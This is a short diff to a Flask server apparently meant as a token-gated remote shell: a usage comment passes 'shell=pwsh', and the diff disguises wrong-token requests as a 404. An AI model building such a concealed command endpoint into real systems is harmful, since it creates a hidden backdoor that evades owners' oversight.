@@ -2,7 +2,7 @@
 # USAGE: curl "127.0.0.1:1234?token=dude&shell=pwsh"
 # import subprocess
 from subprocess import Popen, PIPE, call, run
-from flask import Flask, request
+from flask import Flask, request, abort
 import random
 app = Flask(__name__)
 token = "dude"
@@ -12,7 +12,8 @@ token = "dude"
 def item1():
     # token = "dude"
     if request.args.get("token") != token:
-        return "Denied!"
+        # return "Denied!"
+        abort(404, description="Resource not found")
     else:
         return str(random.randint(1,10))
 @app.route('/hello')
